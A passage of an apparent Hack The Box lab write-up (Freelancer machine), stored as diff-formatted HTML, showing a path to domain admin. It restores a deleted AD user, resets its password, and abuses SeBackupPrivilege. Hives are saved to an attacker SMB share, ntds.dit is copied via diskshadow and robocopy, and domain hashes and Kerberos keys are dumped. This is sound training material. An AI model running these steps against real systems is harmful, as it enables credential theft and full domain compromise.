+sDRightsEffective               : 0
+sn                              : Kazanof
+userAccountControl              : 512
+userPrincipalName               : liza.kazanof@freelancer.com
+uSNChanged                      : 544913
+uSNCreated                      : 540822
+whenChanged                     : 5/14/2024 6:41:44 PM
+whenCreated                     : 5/14/2024 6:37:29 PM
+</span></code></pre></div></div>
+<p>Their logon is liza.kazanof.</p>
+<h4 id="restore-lizakazanof">Restore liza.kazanof</h4>
+<p>To restore that account, I’ll use <code class="language-plaintext highlighter-rouge">restore-adobject</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\&gt;</span><span class="w"> </span><span class="n">restore-adobject</span><span class="w"> </span><span class="nt">-identity</span><span class="w"> </span><span class="nx">ebe15df5-e265-45ec-b7fc-359877217138</span><span class="w">
+</span><span class="go">An attempt was made to add an object to the directory with a name that is already in use
+At line:1 char:1
++ restore-adobject -identity ebe15df5-e265-45ec-b7fc-359877217138
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (CN=Liza Kazanof...eelancer,DC=htb:ADObject) [Restore-ADObject], ADException
+    + FullyQualifiedErrorId : 0,Microsoft.ActiveDirectory.Management.Commands.RestoreADObject
+</span></code></pre></div></div>
+<p>It fails. The name is already in use (which is a bit odd). <code class="language-plaintext highlighter-rouge">-newname</code> will create the object with a new name:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\&gt;</span><span class="w"> </span><span class="n">restore-adobject</span><span class="w"> </span><span class="nt">-identity</span><span class="w"> </span><span class="nx">ebe15df5-e265-45ec-b7fc-359877217138</span><span class="w"> </span><span class="nt">-newname</span><span class="w"> </span><span class="nx">liza.kazanof.0xdf</span><span class="w">
+</span></code></pre></div></div>
+<p>It works, and liza.kazanof is in the users again:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\&gt;</span><span class="w"> </span><span class="n">get-aduser</span><span class="w"> </span><span class="nt">-filter</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">SamAccountName</span><span class="w">
+</span><span class="go">
+SamAccountName
+--------------
+Administrator
+Guest
+krbtgt
+mikasaAckerman
+sshd
+...[snip]...
+lkazanof
+liza.kazanof
+</span><span class="gp">*Evil-WinRM* PS C:\Users\lorra199\Documents&gt;</span><span class="w"> </span><span class="n">get-aduser</span><span class="w"> </span><span class="nt">-filter</span><span class="w"> </span><span class="s1">'SamAccountName -eq "liza.kazanof"'</span><span class="w">
+</span><span class="go">
+DistinguishedName : CN=liza.kazanof.0xdf,CN=Users,DC=freelancer,DC=htb
+Enabled           : True
+GivenName         : Liza
+Name              : liza.kazanof.0xdf
+ObjectClass       : user
+ObjectGUID        : ebe15df5-e265-45ec-b7fc-359877217138
+SamAccountName    : liza.kazanof
+SID               : S-1-5-21-3542429192-2036945976-3483670807-2101
+Surname           : Kazanof
+UserPrincipalName : liza.kazanof@freelancer.com
+</span></code></pre></div></div>
+<h4 id="reset-password--shell">Reset Password / Shell</h4>
+<p>Checking the password now shows a different error, that the password is expired:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb freelancer.htb <span class="nt">-u</span> liza.kazanof <span class="nt">-p</span> <span class="s1">'RockYou!'</span>
+<span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">)
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logpurplefail">[-]</span><span class="go"> freelancer.htb\liza.kazanof:RockYou! STATUS_PASSWORD_EXPIRED
+</span></code></pre></div></div>
+<p>If the password I have is the old one, then I can reset it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>changepasswd.py <span class="s1">'freelancer.htb/liza.kazanof:RockYou!@freelancer.htb'</span> <span class="nt">-newpass</span> <span class="s1">'0xdf0xdf!'</span>
+<span class="go">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Changing the password of freelancer.htb\liza.kazanof
+[*] Connecting to DCE/RPC as freelancer.htb\liza.kazanof
+[!] Password is expired or must be changed, trying to bind with a null session.
+[*] Connecting to DCE/RPC as null session
+[*] Password was changed successfully.
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb freelancer.htb <span class="nt">-u</span> liza.kazanof <span class="nt">-p</span> <span class="s1">'0xdf0xdf!'</span>
+<span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">)
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logsuccess">[+]</span><span class="go"> freelancer.htb\liza.kazanof:0xdf0xdf!
+</span></code></pre></div></div>
+<p>It works over <a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>evil-winrm <span class="nt">-i</span> freelancer.htb <span class="nt">-u</span> liza.kazanof <span class="nt">-p</span> <span class="s1">'0xdf0xdf!'</span>
+<span class="go">                                        
+Evil-WinRM shell v3.5
+                                        
+Info: Establishing connection to remote endpoint
+</span><span class="gp">*Evil-WinRM* PS C:\Users\liza.kazanof\Documents&gt;</span><span class="w">
+</span></code></pre></div></div>
+<h4 id="exploit-sebackupprivilege">Exploit SeBackupPrivilege</h4>
+<p>liza.kazanof has <code class="language-plaintext highlighter-rouge">SeBackupPrivilege</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\&gt;</span><span class="w"> </span><span class="n">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w">
+</span><span class="go">
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+</span></code></pre></div></div>
+<p>I’ve exploited this a couple times before, most recently on <a href="/2020/10/03/htb-blackfield.html#">BlackField</a>. On Blackfield, I showed the exploit using compiled DLLs. Here I’ll exploit it by getting a backup copy of <code class="language-plaintext highlighter-rouge">ntds.dit</code> using <code class="language-plaintext highlighter-rouge">diskshadow</code>.</p>
+<p>I’ll create a SMB share using <code class="language-plaintext highlighter-rouge">smbserver.py</code> for transfer of files to and from Freelancer. I’ll grab copies of the SAM and SYSTEM hives (which I can read because of <code class="language-plaintext highlighter-rouge">SeBackupPrivilege</code>):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\&gt;</span><span class="w"> </span><span class="n">reg</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">hklm\sam</span><span class="w"> </span><span class="nx">\\10.10.14.6\share\sam</span><span class="w">
+</span><span class="go">The operation completed successfully.
+
+</span><span class="gp">*Evil-WinRM* PS C:\&gt;</span><span class="w"> </span><span class="n">reg</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">hklm\system</span><span class="w"> </span><span class="nx">\\10.10.14.6\share\system</span><span class="w">
+</span><span class="go">The operation completed successfully.
+</span></code></pre></div></div>
+<p>This is enough to get the local hashes, but not the domain hashes. For that I need <code class="language-plaintext highlighter-rouge">ntds.dit</code>, which can’t be read directly. I’ll use <code class="language-plaintext highlighter-rouge">diskshadow</code>, which will take a script, saved as <code class="language-plaintext highlighter-rouge">backup</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set verbose on
+set context persistent nowriters
+set metadata C:\Windows\Temp\0xdf.cab
+begin backup
+add volume C: alias cdrive
+create
+expose %cdrive% E:
+end backup
+</code></pre></div></div>
+<p>The script will set the <code class="language-plaintext highlighter-rouge">metadata</code> location (not important, but it needs to exist). It’ll set the backup to be “client accessible” so that they are accessible by me. Then it starts the backup, backing up the <code class="language-plaintext highlighter-rouge">C:\</code> drive into a volume named <code class="language-plaintext highlighter-rouge">cdrive</code>, and then exposing that drive as <code class="language-plaintext highlighter-rouge">E:</code>.</p>
+<p>I’ll create this script on my computer and then use <code class="language-plaintext highlighter-rouge">unix2dos</code> to format it for Windows:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>vim backup
+<span class="gp">oxdf@hacky$</span><span class="w"> </span>unix2dos backup 
+<span class="go">unix2dos: converting file backup to DOS format...
+</span></code></pre></div></div>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">diskshadow</code> passing it the script:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">upload</span><span class="w"> </span><span class="nx">backup</span><span class="w">
+</span><span class="go">
+Info: Uploading /media/sf_CTFs/hackthebox/freelancer-10.10.11.5/backup to C:\programdata\backup
+
+Data: 228 bytes of 228 bytes copied
+
+Info: Upload successful!
+</span><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">diskshadow</span><span class="w"> </span><span class="nx">/s</span><span class="w"> </span><span class="nx">backup</span><span class="w">
+</span><span class="go">Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  DC,  10/15/2024 2:59:17 PM
+
+</span><span class="gp">-&gt;</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="nx">verbose</span><span class="w"> </span><span class="nx">on</span><span class="w">
+</span><span class="gp">-&gt;</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="nx">context</span><span class="w"> </span><span class="nx">persistent</span><span class="w"> </span><span class="nx">nowriters</span><span class="w">
+</span><span class="gp">-&gt;</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="nx">metadata</span><span class="w"> </span><span class="nx">C:\Windows\Temp\0xdf.cab</span><span class="w">
+</span><span class="go">The existing file will be overwritten.
+</span><span class="gp">-&gt;</span><span class="w"> </span><span class="kr">begin</span><span class="w"> </span><span class="n">backup</span><span class="w">
+</span><span class="gp">-&gt;</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">volume</span><span class="w"> </span><span class="nx">C:</span><span class="w"> </span><span class="nx">alias</span><span class="w"> </span><span class="nx">cdrive</span><span class="w">
+</span><span class="gp">-&gt;</span><span class="w"> </span><span class="n">create</span><span class="w">
+</span><span class="go">
+Alias cdrive for shadow ID {da62a7a6-9ab3-414e-9721-62509d79f850} set as environment variable.
+Alias VSS_SHADOW_SET for shadow set ID {52fc981a-fe50-4f58-b866-3f5c45eaa703} set as environment variable.
+Inserted file Manifest.xml into .cab file 0xdf.cab
+Inserted file DisCF45.tmp into .cab file 0xdf.cab
+
+Querying all shadow copies with the shadow copy set ID {52fc981a-fe50-4f58-b866-3f5c45eaa703}
+
+        * Shadow copy ID = {da62a7a6-9ab3-414e-9721-62509d79f850}               %cdrive%
+                - Shadow copy set: {52fc981a-fe50-4f58-b866-3f5c45eaa703}       %VSS_SHADOW_SET%
+                - Original count of shadow copies = 1
+                - Original volume name: \\?\Volume{011d3cdb-0000-0000-0000-602200000000}\ [C:\]
+                - Creation time: 10/15/2024 2:59:17 PM
+                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4
+                - Originating machine: DC.freelancer.htb
+                - Service machine: DC.freelancer.htb
+                - Not exposed
+                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
+                - Attributes:  No_Auto_Release Persistent No_Writers Differential
+
+Number of shadow copies listed: 1
+</span><span class="gp">-&gt;</span><span class="w"> </span><span class="n">expose</span><span class="w"> </span><span class="o">%</span><span class="nx">cdrive</span><span class="o">%</span><span class="w"> </span><span class="nx">E:</span><span class="w">
+</span><span class="gp">-&gt;</span><span class="w"> </span><span class="o">%</span><span class="n">cdrive</span><span class="o">%</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="n">da62a7a6-9ab3-414e-9721-62509d79f850</span><span class="p">}</span><span class="w">
+</span><span class="go">The shadow copy was successfully exposed as E:\.
+</span><span class="gp">-&gt;</span><span class="w"> </span><span class="kr">end</span><span class="w"> </span><span class="n">backup</span><span class="w">
+</span><span class="gp">-&gt;</span><span class="w">
+</span></code></pre></div></div>
+<p>It seems to work. <code class="language-plaintext highlighter-rouge">E:\</code> looks like a backup of <code class="language-plaintext highlighter-rouge">C:\</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="nx">E:\</span><span class="w">
+</span><span class="go">
+    Directory: E:\
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        5/24/2024   7:30 PM                apps
+d-----         6/3/2024  10:50 AM                nginx
+d-----        5/28/2024  11:47 AM                PerfLogs
+d-r---        5/28/2024   2:18 PM                Program Files
+d-----        5/28/2024   2:18 PM                Program Files (x86)
+d-----        5/27/2024   7:50 AM                temp
+d-r---        10/6/2024   9:57 PM                Users
+d-----        5/28/2024  11:50 AM                Windows
+</span></code></pre></div></div>
+<p>I still don’t have access to copy files from this drive through. I’ll have to use <code class="language-plaintext highlighter-rouge">robocopy</code> to do it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">copy</span><span class="w"> </span><span class="nx">E:\windows\ntds\ntds.dit</span><span class="w"> </span><span class="o">.</span><span class="w">
+</span><span class="go">Access to the path 'E:\windows\ntds\ntds.dit' is denied.
+At line:1 char:1
++ copy E:\windows\ntds\ntds.dit .
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (E:\windows\ntds\ntds.dit:FileInfo) [Copy-Item], UnauthorizedAccessException
+    + FullyQualifiedErrorId : CopyFileInfoItemUnauthorizedAccessError,Microsoft.PowerShell.Commands.CopyItemCommand
+</span><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">robocopy</span><span class="w"> </span><span class="nx">/b</span><span class="w"> </span><span class="nx">E:\Windows\ntds</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="nx">ntds.dit</span><span class="w">
+</span><span class="go">
+-------------------------------------------------------------------------------
+   ROBOCOPY     ::     Robust File Copy for Windows
+-------------------------------------------------------------------------------
+
+  Started : Sunday, October 6, 2024 10:04:10 PM
+   Source : E:\Windows\ntds\
+     Dest : C:\programdata\
+
+    Files : ntds.dit
+
+  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30
+
+------------------------------------------------------------------------------
+
+                           1    E:\Windows\ntds\
+            New File              16.0 m        ntds.dit
+  0.0%
+  0.3%
+  0.7%
+  1.1%
+  1.5%
+...[snip]...
+ 99.6%
+100%
+100%
+
+------------------------------------------------------------------------------
+
+               Total    Copied   Skipped  Mismatch    FAILED    Extras
+    Dirs :         1         0         1         0         0         0
+   Files :         1         1         0         0         0         0
+   Bytes :   16.00 m   16.00 m         0         0         0         0
+   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
+
+
+   Speed :            97541953 Bytes/sec.
+   Speed :            5581.395 MegaBytes/min.
+   Ended : Sunday, October 6, 2024 10:04:10 PM
+</span></code></pre></div></div>
+<p>I’ll download this file as well.</p>
+<p>From these, I can dump the domain hashes:</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span>secretsdump.py <span class="nt">-ntds</span> ntds.dit <span class="nt">-system</span> system <span class="nb">local</span>
+<span class="go">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Target system bootKey: 0x9db1404806f026092ec95ba23ead445b
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 69f0afd7f9c47bac4a83dded01eb9dea
+[*] Reading and decrypting hashes from ntds.dit
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0039318f1e8274633445bce32ad1a290:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC$:1000:aad3b435b51404eeaad3b435b51404ee:89851d57d9c8cc8addb66c59b83a4379:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d238e0bfa17d575038efc070187a91c2:::
+freelancer.htb\mikasaAckerman:1105:aad3b435b51404eeaad3b435b51404ee:e8d62c7d57e5d74267ab6feb2f662674:::
+sshd:1108:aad3b435b51404eeaad3b435b51404ee:c1e83616271e8e17d69391bdcd335ab4:::
+SQLBackupOperator:1112:aad3b435b51404eeaad3b435b51404ee:c4b746db703d1af5575b5c3d69f57bab:::
+sql_svc:1114:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
+DATACENTER-2019$:1115:aad3b435b51404eeaad3b435b51404ee:7a8b0efef4571ec55cc0b9f8cb73fdcf:::
+lorra199:1116:aad3b435b51404eeaad3b435b51404ee:67d4ae78a155aab3d4aa602da518c051:::
+freelancer.htb\maya.artmes:1124:aad3b435b51404eeaad3b435b51404ee:22db50a324b9a34ea898a290c1284e25:::
+freelancer.htb\michael.williams:1126:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
+freelancer.htb\sdavis:1127:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\d.jones:1128:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\jen.brown:1129:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\taylor:1130:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\jmartinez:1131:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\olivia.garcia:1133:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\dthomas:1134:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\sophia.h:1135:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\Ethan.l:1138:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\wwalker:1141:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\jgreen:1142:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\evelyn.adams:1143:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\hking:1144:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\alex.hill:1145:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\samuel.turner:1146:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\ereed:1149:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\leon.sk:1151:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
+DATAC2-2022$:1155:aad3b435b51404eeaad3b435b51404ee:007a710c0581c63104dad1e477c794e8:::
+WS1-WIIN10$:1156:aad3b435b51404eeaad3b435b51404ee:57e57c6a3f0f8fff74e8ab524871616b:::
+WS2-WIN11$:1157:aad3b435b51404eeaad3b435b51404ee:bf5267ee6236c86a3596f72f2ddef2da:::
+WS3-WIN11$:1158:aad3b435b51404eeaad3b435b51404ee:732c190482eea7b5e6777d898e352225:::
+DC2$:1159:aad3b435b51404eeaad3b435b51404ee:e1018953ffa39b3818212aba3f736c0f:::
+freelancer.htb\carol.poland:1160:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
+freelancer.htb\lkazanof:1162:aad3b435b51404eeaad3b435b51404ee:a26c33c2878b23df8b2da3d10e430a0f:::
+freelancer.com\liza.kazanof:2101:aad3b435b51404eeaad3b435b51404ee:990f5eb0caa0773fb5b3df18692eea92:::
+SETUPMACHINE$:8601:aad3b435b51404eeaad3b435b51404ee:f5912663ecf2c8cbda2a4218127d11fe:::
+[*] Kerberos keys from ntds.dit
+Administrator:aes256-cts-hmac-sha1-96:1743fa93ed1f2f505d3c7cd6ef1e8c40589f107070065e98efc89ea907d81601
+Administrator:aes128-cts-hmac-sha1-96:bd23b1924f1fd0bdc60abf464114a867
+Administrator:des-cbc-md5:0d400dfe572a3262
+DC$:aes256-cts-hmac-sha1-96:561edbca437df7878b890f544efd54ed5a86443cf658ddd313ffb33464c537fe
+DC$:aes128-cts-hmac-sha1-96:fb08d27ee4139adcb6a2cc33745af2f3
+DC$:des-cbc-md5:67c85d34a708e334
+krbtgt:aes256-cts-hmac-sha1-96:4e33b02ee45738a0db98c0747d8d41b7205f4f583c8f0591e20d67178b20511d
+krbtgt:aes128-cts-hmac-sha1-96:adcc7fdd6f19591bbefa232ed8694c43
+krbtgt:des-cbc-md5:04d3cd1cbaea5262
+freelancer.htb\mikasaAckerman:aes256-cts-hmac-sha1-96:6164b1e12f315d3a6e9f7fc602e1e27ff14f74f344d6cd0ed6cb748ec5650c69
+freelancer.htb\mikasaAckerman:aes128-cts-hmac-sha1-96:a756aa73641bd3773edfa97cb6bf54ed
+freelancer.htb\mikasaAckerman:des-cbc-md5:ab1ce53d6eb5b62a
+sshd:aes256-cts-hmac-sha1-96:a8782de0299ca5fe9658b4813aa47b80097f54c76e1311e160947bdb0b366660
+sshd:aes128-cts-hmac-sha1-96:f00346995373fef1641c6e5b90b74424
+sshd:des-cbc-md5:01a2976764688a73
+SQLBackupOperator:aes256-cts-hmac-sha1-96:054901226a3869da55b25ed0c8c1d9fba0130f7bec9441f51e6d58e5aa645d74
+SQLBackupOperator:aes128-cts-hmac-sha1-96:c7e1a5cb1ae6fe0cb333075ccceb7215
+SQLBackupOperator:des-cbc-md5:549eda3480ceab92
+sql_svc:aes256-cts-hmac-sha1-96:91c836ba7777d253101c7052c78016ba11b25696fe1e0afbabcc2745c8c23dd5
+sql_svc:aes128-cts-hmac-sha1-96:c08735502e4220b00a8555282f207bb8
+sql_svc:des-cbc-md5:aea8fddc4a2a0162
+DATACENTER-2019$:aes256-cts-hmac-sha1-96:87ed12bf74dbd8e3cf0f12e7c5de9537dcc35ed889950d14b0f9e753545a808c
+DATACENTER-2019$:aes128-cts-hmac-sha1-96:aa9becc6a8437c4f4b4ca56a9230634a
+DATACENTER-2019$:des-cbc-md5:615d43ce97e61370
+lorra199:aes256-cts-hmac-sha1-96:4411e57eea44e7064c4aa478a42dbbee00e503de94be38a024b92a12c712f646
+lorra199:aes128-cts-hmac-sha1-96:cbd6cbc21ef3685c96e57ce0dee0ea37
+lorra199:des-cbc-md5:7c6de98967578cce
+freelancer.htb\maya.artmes:aes256-cts-hmac-sha1-96:87dbbb7747315d238fbc8cf2b491fb2440ec5df911fef4c960d5f6a3d8880417
+freelancer.htb\maya.artmes:aes128-cts-hmac-sha1-96:b471a81c44f36cbae619f40716c7c8bd
+freelancer.htb\maya.artmes:des-cbc-md5:011623c2e0ce4c1a
+freelancer.htb\michael.williams:aes256-cts-hmac-sha1-96:6d6c00a78f43971ce12cced2a0e9eba91b1e17deb2826b55263bff1d87b439fc
+freelancer.htb\michael.williams:aes128-cts-hmac-sha1-96:74042a3a68bc861289f672e0d27fe6b6
+freelancer.htb\michael.williams:des-cbc-md5:83837cc7617f52a4
+freelancer.htb\sdavis:aes256-cts-hmac-sha1-96:be5c22288453e08f76be3f11d7e4c9cda128be135537895aa8d68fb01c1be9e0
+freelancer.htb\sdavis:aes128-cts-hmac-sha1-96:d05709ee072d825c3f323be21475a7ea
+freelancer.htb\sdavis:des-cbc-md5:bccb52aedf98fb1f
+freelancer.htb\d.jones:aes256-cts-hmac-sha1-96:bab008e4e24beafd524f0081cf15b0eafea3585f963fa6947f701eb6f820ca33
+freelancer.htb\d.jones:aes128-cts-hmac-sha1-96:0ebb687442c5c2c515ad00205fab2a6f
+freelancer.htb\d.jones:des-cbc-md5:1cd3da20bae3c198
+freelancer.htb\jen.brown:aes256-cts-hmac-sha1-96:0298d308060494d06232656f455829ab27f24789520d1cc66f89ee97d3174d0d
+freelancer.htb\jen.brown:aes128-cts-hmac-sha1-96:1894401fd91b66ff2d6d63fcfe662313
+freelancer.htb\jen.brown:des-cbc-md5:342ce9a42ace8092
+freelancer.htb\taylor:aes256-cts-hmac-sha1-96:cbf730581c4cbb76462a9b0e5517da7b70e13d5103cc68e3483b2c093f0b5d7c
+freelancer.htb\taylor:aes128-cts-hmac-sha1-96:d444dcd43270907c762b4869dc47bd47
+freelancer.htb\taylor:des-cbc-md5:1f6edf615725c80e
+freelancer.htb\jmartinez:aes256-cts-hmac-sha1-96:83ec85539004c5aa3fb840eab3249a2700fb5cee564e6b0b40c0009670744660
+freelancer.htb\jmartinez:aes128-cts-hmac-sha1-96:89b817a7ed0f6e7ac6e41df723cdb1c2
+freelancer.htb\jmartinez:des-cbc-md5:6bfde3ea0d04c1b0
+freelancer.htb\olivia.garcia:aes256-cts-hmac-sha1-96:3ca56134c8c738873fdcb19fafea3c8b39d5eaaab005a4e1b24a9bcdec0761d0
+freelancer.htb\olivia.garcia:aes128-cts-hmac-sha1-96:e31085216515ef081b92cc4ab827765c
+freelancer.htb\olivia.garcia:des-cbc-md5:3bdaa40d31b345f4
+freelancer.htb\dthomas:aes256-cts-hmac-sha1-96:6a73a933a0b4007798a65127b8917922bb3e1b2d5d3acc1dfd904cb86bf05842
+freelancer.htb\dthomas:aes128-cts-hmac-sha1-96:d527381366a92d8ceb759f9aa21326e8
+freelancer.htb\dthomas:des-cbc-md5:abbffb891f153883
+freelancer.htb\sophia.h:aes256-cts-hmac-sha1-96:77d45db16e39bd96386975610299c7f2c675ec32d8a92cd340357b7656b9e78b
+freelancer.htb\sophia.h:aes128-cts-hmac-sha1-96:7ad896f3839a23370dc2158d15ed23bb
+freelancer.htb\sophia.h:des-cbc-md5:7c1cb0d654517a57
+freelancer.htb\Ethan.l:aes256-cts-hmac-sha1-96:4a19d9711f7e182d14bde755de201c3b387ec800e5d8a4b65c304c702cd931ac
+freelancer.htb\Ethan.l:aes128-cts-hmac-sha1-96:5d281646333e0f988591f4d9f5839acf
+freelancer.htb\Ethan.l:des-cbc-md5:451abc9b4cc1cb61
+freelancer.htb\wwalker:aes256-cts-hmac-sha1-96:9566d111248ca62a7fd615ec0ecf17110cb5ce8d4db6ae70f155003d843e35ee
+freelancer.htb\wwalker:aes128-cts-hmac-sha1-96:cd5ff86e6729e674745be70c08b0699f
+freelancer.htb\wwalker:des-cbc-md5:c131709d8f7f61a8
+freelancer.htb\jgreen:aes256-cts-hmac-sha1-96:b6f58646adf12516edf197ce30dcda3e4c0966f2868183a2c02bba7e2241b162
+freelancer.htb\jgreen:aes128-cts-hmac-sha1-96:2b321949c61ad2e75918e2bf7efd4724
+freelancer.htb\jgreen:des-cbc-md5:405b6208ecc82057
+freelancer.htb\evelyn.adams:aes256-cts-hmac-sha1-96:96a7f8556b8a2fad3f13184735b5e4657a6baf98b0f28036ab546562917eff36
+freelancer.htb\evelyn.adams:aes128-cts-hmac-sha1-96:ed59b48e2d08731cc6ee7ebd791ab415
+freelancer.htb\evelyn.adams:des-cbc-md5:526bda25ef3204f7
+freelancer.htb\hking:aes256-cts-hmac-sha1-96:877b3ae2722aced00d78b66a0aad4ddbcc37fd8c1179d1d43a7478569a655771
+freelancer.htb\hking:aes128-cts-hmac-sha1-96:2030e3efff50f998a9616aef40ea3578
+freelancer.htb\hking:des-cbc-md5:869238df6868d913
+freelancer.htb\alex.hill:aes256-cts-hmac-sha1-96:eeed403dc3fe63e53c6b6230f9a8980a21ee3b85e70a428d136e1632503e0d60
+freelancer.htb\alex.hill:aes128-cts-hmac-sha1-96:1cc28dac35933ca7c1f5aadf7ba27a26
+freelancer.htb\alex.hill:des-cbc-md5:e9abe0493eda04fb
+freelancer.htb\samuel.turner:aes256-cts-hmac-sha1-96:6a1f51c13337648de96112140c42cd64e2d13a0dc74c52f668f788ad90163df2
+freelancer.htb\samuel.turner:aes128-cts-hmac-sha1-96:8c8efb5dbdc3498008a039a5259c770d
